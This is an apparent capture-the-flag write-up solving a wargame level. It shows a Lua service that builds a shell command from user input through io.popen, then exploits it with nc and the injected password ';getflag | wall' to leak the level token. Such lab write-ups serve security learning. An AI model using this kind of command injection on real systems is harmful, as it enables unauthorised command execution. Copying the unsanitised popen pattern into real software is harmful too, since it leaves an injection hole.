# Yeah new mechanic
# We have this file -> level11.lua owned by flag11

./level11.lua
>lua: ./level11.lua:3: address already in use
>stack traceback:
>	[C]: in function 'assert'
>	./level11.lua:3: in main chunk
>	[C]: ?

# We read the code 
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") # This hash fucntion seems weak with the echo
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

# We connect to the port
nc localhost 5151
> Password: 

# Let's broke the echo we saw earlier
Password: ;getflag | wall
> Broadcast Message from flag11@Snow
>        (somewhere) at 14:37 ...
>
>Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
>
>Erf nope..

# nope..BUT YES
